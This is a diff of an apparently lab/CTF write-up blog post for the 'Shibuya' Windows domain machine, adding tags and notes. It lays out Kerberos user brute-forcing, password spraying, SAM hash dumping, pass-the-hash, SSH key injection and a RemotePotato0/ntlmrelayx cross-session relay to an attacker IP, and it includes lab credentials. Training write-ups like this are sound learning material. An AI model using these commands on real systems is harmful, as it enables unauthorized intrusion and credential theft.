@@ -5,17 +5,27 @@ ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-01-31T03:41:02.909Z
+  - netexec
+  - smb-username-collect
+  - kerberbrute
+  - smb-description
+  - netexec-kerberos-auth
+  - wim
+  - netexec-spider
+  - SAM-SYSTEM-SECUITY
+  - SAM-SYSTEM-SECUITY-hashcrack
+  - netexec-users-hashs
+  - smb-login-with-hash
+  - smb-to-ssh
+  - bloodhound-observe-HasSession
+  - windows-Firewall-Enumeration
+lastmod: 2026-02-06T09:57:06.323Z
 ---
 # Box  Info
 
 ![Pasted image 20260120160504.png](/ob/Pasted%20image%2020260120160504.png)
 
-```
 Shibuya is a Medium Windows machine that starts of with the SMB port exposed. Enumerating possible usernames through Kerberos an attacker is able to find the valid machine account `red:red`. With these credentials, he can further enumerate the remote users and discover that the user `svc_autojoin` has a password in its description. With this account in hand, he is able to discover some `Windows Imaging Format (.wmi)` files that contain hashes for the user `simon.watson`. Now, the attacker has command execution through SSH on the remote machine and is able to enumerate that another user has an active interactive session. By performing a cross-session relay attack he is able to steal the hash and crack the password for the user `nigel.mills`. The new user is member of the `t1_admin` groups which has enrolment rights on a certificate template that's vulnerable to `ESC1` and by exploiting it we are able to gain `SYSTEM` privileges on the machine.
-```
-
-\#smb-enum #AD-account-brute-force #kerbrute #wimtools #wim #secretsdump\_py #hashcat #bloodhound #hassession #RemotePotato0 #ntlmrelayx #RunasCS #Certipy #ESC1 #chisel #smbclient
 
 ***
 
@@ -90,7 +100,13 @@ Nmap done: 1 IP address (1 host up) scanned in 97.94 seconds
 
 ### DNS
 
-only the `netexec smb 10.129.32.246  --generate-hosts-file hosts` is dont work , you have to add into the `/etc/host` and successfully ping it ;otherwise, you cant login it , Also you n3ed to use the `-k` in netexec to login
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "netexec" >}}  The netexec will auto generate the  file for you to add into the /etc/hosts
+
+{{< /toggle >}}
+
+only the `netexec smb 10.129.32.246  --generate-hosts-file hosts` is dont work , you have to add into the `/etc/host` and successfully ping it ;otherwise, you cant login it , Also you need to use the `-k` in netexec to login
 
 ```shell
 └─# ping shibuya.vl
@@ -113,7 +129,12 @@ SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red
 
 ### SMB 445 --Scan
 
-Don’t get too much information form here ;thereforce,i will use the username brute-force
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "smb-username-collect" >}}  when the windows smb share the home directory it will possible show the users 's name .
+
+{{< /toggle >}}
+Don’t get too much information form here ;Howevr,we got the `homes` directory which show the username
 
 ```
 └─# nxc smb 10.129.234.42/24 -u 'guest' -p '' --shares
@@ -147,10 +168,22 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 ### kerbrute
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "kerberbrute" >}} have the usernames list from smb share , also add the xato-net-10-million-usernames.txt list , so kerbrute verify the user of purple and red
+
+{{< /toggle >}}
+
+download the xato-net-10-million-usernames.txt
+
+```
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/xato-net-10-million-usernames.txt
+```
+
 Use the xato-net-10-million and the smb share usernames to successfully find the account red by [kerbrute](https://github.com/ropnop/kerbrute)
 
 ```shell
-└─# ../kerbrute_dev userenum --dc 10.129.32.246 -d shibuya.vl xato-net-10-mil
+└─# ../kerbrute_dev userenum --dc 10.129.32.246 -d shibuya.vl ./xato-net-10-million-usernames.txt
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -184,10 +217,22 @@ I will the the Same account name and same password ,also try the Cipher Transfor
 ./kerbrute_dev passwordspray -d shibuya.vl --dc 10.129.32.246 valid_users.txt passwords.txt
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "netexec-kerberos-auth" >}} smb need the kerberos auth with -k
+
+{{< /toggle >}}
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "smb-description" >}} The smb Description show something like the password
+
+{{< /toggle >}}
+
 Successfully login ,but need to use the -k of kerberos auth ,and the Description show the something like the password of K5\&A6Dw9d8jrKWhV
 
 ```
-└─# netexec smb shibuya.vl   -u 'red'  -p 'red'   -k  --users            
+└─# netexec smb shibuya.vl   -u 'red'  -p 'red'  -k  --users            
 SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red 
 SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-                                               
@@ -222,10 +267,16 @@ SMB         shibuya.vl      445    AWSJPDC0522      users           READ
                                                                                                                         
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "netexec-spider" >}}  [reference](https://www.netexec.wiki/smb-protocol/spidering-shares)  find the folder of 'images\$' 's all file --regex into local machine
+
+{{< /toggle >}}
+
 The shares of `images$` dont have it before, so i will use the ` --spider 'folder' --regex .` and found the `wim` which is something like the `iso` stuff , after google , i am able to use the `wimtools`  to mount it
 
 ```
-└─# netexec smb shibuya.vl   -u 'svc_autojoin'  -p 'K5&A6Dw9d8jrKWhV'   -k   --spider 'images$' --regex .
+└─# netexec smb shibuya.vl   -u 'svc_autojoin'  -p 'K5&A6Dw9d8jrKWhV' -k --spider 'images$' --regex .
 SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
 SMB         shibuya.vl      445    AWSJPDC0522      [*] Spidering .
@@ -239,6 +290,12 @@ SMB         shibuya.vl      445    AWSJPDC0522      //shibuya.vl/images$/vss-met
 ```
 
 ### wimtools
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "wim" >}}  the (Windows Imaging) wim file something like the iso file that was introduced in Windows Vista. It is primarily used to capture, to modify, and to apply file-based disk images for rapid deployment . There it can read by wimtools tools
+
+{{< /toggle >}}
 
 ```
 sudo apt update
@@ -265,6 +322,12 @@ sudo wimmount AWSJPWK0222-03.wim 1 /mnt/htb2
 hgfs  htb  htb1  htb2
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "SAM-SYSTEM-SECUITY" >}}  SAM : stores locally cached credentials (referred to as SAM secrets) , SECURITY : stores domain cached credentials (referred to as LSA secrets) , SYSTEM : contains enough info to decrypt SAM secrets and LSA secrets . Therefore use the secretsdump.py to get the hash
+
+{{< /toggle >}}
+
 Found the `SAM` , `SYSTEM` , `SECUITY` ,so need to copy the editable place .
 
 ```
@@ -280,8 +343,6 @@ Found the `SAM` , `SYSTEM` , `SECUITY` ,so need to copy the editable place .
 
 
 ```
-
-### secretsdump.py
 
 `secretsdump.py` usage , found a lot of hash , i will put in the `crackstation` for review
 
@@ -315,7 +376,13 @@ NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401e
                                                                                                                                                
 ```
 
-The crackstation show that only have one hash is successful (2 is the same) \`\`\
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "SAM-SYSTEM-SECUITY-hashcrack" >}}  Using the online platform of crackstation to get the hash
+
+{{< /toggle >}}
+
+The crackstation show that only have one hash is successful (2 is the same)\
 ![Pasted image 20260121155534.png](/ob/Pasted%20image%2020260121155534.png)
 
 # Shell as Simon.Watson
@@ -343,6 +410,12 @@ operator
 Simon.Watson 
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "netexec-users-hashs" >}}  Burte-force with the username and the hashes by netexec
+
+{{< /toggle >}}
 
 Burte-force with the username and the hashes
 
@@ -392,7 +465,19 @@ SMB         10.129.32.246   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "smb-login-with-hash" >}}  although the netexec can show the info with hashes , but only the smbclient can interact the file with hashes
+
+{{< /toggle >}}
+
 `Simon.Watson` and `5d8c3d1a20bd63f60f469f6763ca0d50` success
+
+login the  Simon.Watson with the smbclient
+
+```
+ smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
+```
 
 ```
 └─# netexec rdp  shibuya.vl   -u Simon.Watson   -H 5d8c3d1a20bd63f60f469f6763ca0d50      
@@ -415,19 +500,8 @@ SMB         10.129.32.246   445    AWSJPDC0522      images$         READ
 SMB         10.129.32.246   445    AWSJPDC0522      IPC$            READ            Remote IPC
 SMB         10.129.32.246   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
 SMB         10.129.32.246   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
-SMB         10.129.32.246   445    AWSJPDC0522      users           READ            
-                                                                                            
+SMB         10.129.32.246   445    AWSJPDC0522      users           READ                                                                                                        
 ```
-
-login the  Simon.Watson with the smbclient
-
-```
- smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50
-```
-
-### SSH Authorized Keys Injection (T1098.004)
-
-Knew the Simon.Watson is writeable that also mean i can ssh login due to i can put the ssh public key in the `.ssh` folder with the authorized\_keys
 
 ```
                                                     
@@ -496,6 +570,14 @@ smb: \simon.watson\Desktop\>
 └─# cat user.txt 
 73531560a013b61326392eba28efc261                                                                                                                       
 ```
+
+### SSH Authorized Keys Injection (T1098.004)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "smb-to-ssh" >}}  The user of Simon.Watson folder is writeable that also mean i can ssh login due to i can put the ssh public key in the `.ssh` folder with the authorized\_keys
+
+{{< /toggle >}}
 
 Create the private key if you dont have it with `ssh-keygen` with the ed25519 encoded
 
@@ -577,7 +659,15 @@ shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>
 
 # Shell as nigel.mills
 
-show that we can upgrade the `nigel.mills` ,as the bloodhound show that the `shibuya\simon.watson@AWSJPDC0522` has the `HasSession` to nigel.mills
+### bloodhound HasSession
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "bloodhound-observe-HasSession" >}}  The bloodhound show that the `shibuya\simon.watson@AWSJPDC0522` has the `HasSession` to nigel.mills
+
+{{< /toggle >}}
+
+bloodhound show that we can upgrade the `nigel.mills` ,as the bloodhound show that the `shibuya\simon.watson@AWSJPDC0522` has the `HasSession` to nigel.mills
 
 ```
     C:\Users\Administrator
@@ -588,11 +678,7 @@ show that we can upgrade the `nigel.mills` ,as the bloodhound show that the `shi
     C:\Users\Public
 ```
 
-### bloodhound HasSession
-
 ![Pasted image 20260121221727.png](/ob/Pasted%20image%2020260121221727.png)
-
-### runasCS
 
 *RunasCs* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin *runas.exe* that solves some limitations:
 
@@ -626,9 +712,7 @@ shibuya\simon.watson@AWSJPDC0522 C:\ProgramData>.\RunasCs.exe SIMON.WATSON SIMON
 https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security\_logon\_type\
 ![Pasted image 20260122001420.png](/ob/Pasted%20image%2020260122001420.png)
 
-### ntlmrelayx.py
-
-This module performs the SMB Relay attacks originally discovered by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc). It receives a list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first try to authenticate against the client connecting to us.
+`ntlmrelayx.py` module performs the SMB Relay attacks originally discovered by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc). It receives a list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first try to authenticate against the client connecting to us.
 
 open the ntlmrelayx.py to wait the `RemotePotato0.exe` to send the request to me
 
@@ -682,14 +766,43 @@ OSError: [Errno 98] Address already in use
 [*] (HTTP): Connection from 10.129.234.42 controlled, attacking target ldap://10.129.0.1
 ```
 
-### RemotePotato0.exe
+{{< toggle "Tag 🏷️" >}}
 
-It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.
+{{< tag "windows-Firewall-Enumeration" >}}  need to know the filewall which port is allow the traffic
+
+{{< /toggle >}}
+
+```
+powershell -Command "netsh advfirewall firewall show rule name=all | ForEach-Object { if ($_ -match '^Rule Name:') { $c = @($_) } elseif ($_ -eq '') { $b = $c -join [char]10; if ($b -match 'Enabled:\s+Yes' -and $b -match 'Direction:\s+In' -and $b -match 'Profiles:\s+.*Domain' -and $b -match 'Protocol:\s+TCP') { $b; [char]10 }; $c = @() } else { $c += $_ } }"
+```
+
+The first rule is named Custom TCP Allow, and allows 8000-9000 in.
+
+![Pasted image 20260206174306.png](/ob/Pasted%20image%2020260206174306.png)
+
+```
+Rule Name:                            Custom TCP Allow
+----------------------------------------------------------------------
+Enabled:                              Yes
+Direction:                            In
+Profiles:                             Domain,Private,Public
+Grouping:
+LocalIP:                              Any
+RemoteIP:                             Any
+Protocol:                             TCP
+LocalPort:                            8000-9000
+RemotePort:                           Any
+Edge traversal:                       No
+Action:                               Allow
+```
+
+`RemotePotato0.exe` abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user). Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.
 
 1. -m 2 --> Module 2 - Rpc capture (hash) server + potato trigger
 2. -r 10.10.14.54 --> the remote host
 3. -x 10.10.14.54 -->  the remote host ,  Rogue Oxid Resolver ip (default 127.0.0.1)
 4. -s  1 --> Session id for the Cross Session Activation attack (default disabled) (i get it from the RunasCS.exe)
+5. -p 8888 due to only the port 8888 dont have the filewall
 
 ```
 shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson\.ssh>.\RemotePotato0.exe -m 2 -r 10.10.14.54 -x 10.10.14.54 -p 8888  -s 1 
